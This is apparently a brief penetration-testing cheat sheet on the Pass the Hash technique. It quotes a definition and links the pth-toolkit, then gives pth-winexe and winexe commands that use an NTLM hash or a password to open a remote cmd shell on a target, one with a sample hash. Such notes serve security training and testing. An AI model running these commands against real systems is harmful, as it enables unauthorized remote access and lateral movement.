# Pass the Hash (PtH)

> In cryptanalysis and computer security, pass the hash is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user's password, instead of requiring the associated plaintext password as is normally the case.   
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)</cite>

## pth-winexe

> Modified version of the passing-the-hash tool collection made to work straight out of the box  
* [GitHub - byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
* [Pass the Hash toolkit, Winexe | Kali Linux](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)

Launch cmd.exe using pth
```bash
pth-winexe -U <user>%<ntlm-pw-hash> //<ip> cmd
```

or export hash?
```bash
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator% //10.11.01.76 cmd
```

or password (instead of hash)
```bash
winexe -U <machine/name> //<ip> cmd.exe
```
-> Enter pw
